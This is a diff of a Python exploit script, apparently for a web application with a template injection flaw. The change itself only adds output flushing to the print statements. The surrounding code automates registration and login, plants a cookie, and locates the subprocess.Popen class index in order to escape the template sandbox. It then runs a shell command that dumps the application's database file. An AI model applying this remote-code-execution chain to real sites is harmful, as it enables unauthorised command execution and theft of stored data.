@@ -16,7 +16,7 @@ USER_AGENT = UserAgent().random
 def retrieve_csrf_token(s: Session, url: str) -> str:
     data = s.get(url).text
     soup = BeautifulSoup(data, 'html.parser')
-    print(f'[+] Retrieved csrf_token from {url}')
+    print(f'[+] Retrieved csrf_token from {url}', flush=True)
     return soup.find(attrs={'id': 'csrf_token'})['value']
 
 
@@ -29,7 +29,7 @@ def register(s: Session, url: str) -> None:
         'password': PASSWORD,
         'submit': 'Submit'
     })
-    print('[+] Registered')
+    print('[+] Registered', flush=True)
 
 
 def login(s: Session, url: str) -> None:
@@ -41,7 +41,7 @@ def login(s: Session, url: str) -> None:
         'password': PASSWORD,
         'submit': 'Submit'
     })
-    print('[+] Logged in')
+    print('[+] Logged in', flush=True)
 
 
 def create_cookie(s: Session, url: str, cookie: dict) -> str:
@@ -55,7 +55,7 @@ def create_cookie(s: Session, url: str, cookie: dict) -> str:
     })
     data = s.get(url).text
     soup = BeautifulSoup(data, 'html.parser')
-    print(f'[+] Created cookie: {cookie["name"]}:{cookie["value"]}')
+    print(f'[+] Created cookie: {cookie["name"]}:{cookie["value"]}', flush=True)
     return soup.find(attrs={'class': 'card-link'})['href']
 
 
@@ -70,7 +70,7 @@ def get_popen_index(s: Session, url: str) -> str:
     soup = BeautifulSoup(data, 'html.parser')
     subclasses = soup.find(attrs={'class': 'lead'}).get_text()[1:-1]
     subclasses = subclasses.split(', ')
-    print(f'[+] Retrieved subprocess.Popen index')
+    print(f'[+] Retrieved subprocess.Popen index', flush=True)
     return subclasses.index("<class 'subprocess.Popen'>")
 
 
@@ -97,9 +97,9 @@ def main() -> None:
         register(s, url)
         login(s, url)
         db = execute_shell(s, url, 'strings app.db')
-        print(db)
+        print(db, flush=True)
     except:
-        print('[-] Something went wrong')
+        print('[-] Something went wrong', flush=True)
 
 
 if __name__ == '__main__':
